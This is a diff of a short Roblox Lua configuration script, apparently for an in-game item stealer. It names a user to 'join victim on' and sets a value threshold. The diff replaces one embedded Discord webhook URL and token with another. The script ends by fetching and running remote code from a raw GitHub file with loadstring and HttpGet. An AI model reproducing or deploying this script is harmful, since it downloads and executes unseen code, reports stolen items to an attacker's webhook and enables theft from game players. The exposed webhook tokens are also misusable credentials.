@@ -1,7 +1,7 @@
 _G.Username = "8cpeHolder" -- user you should join victim on
 _G.min_value = 0.3
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1360925178694996160/mPvQokVSot6yzrpPgI0E9lbYZbZsLO9YcHZ-orCnkgMXE9Ctov4yZYmcLH_H0PCTkDip"
+_G.webhook = "https://discord.com/api/webhooks/1361409312626577600/sxbMrijdZ5TeAdsaX6u2F1MXRk_mokgzSysq2CEc-zI2Qoktkc8GykEK_BlBAwpC-Nlq"
 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/adoptme3/cxzcz/refs/heads/main/cxzcxzcz",true))()
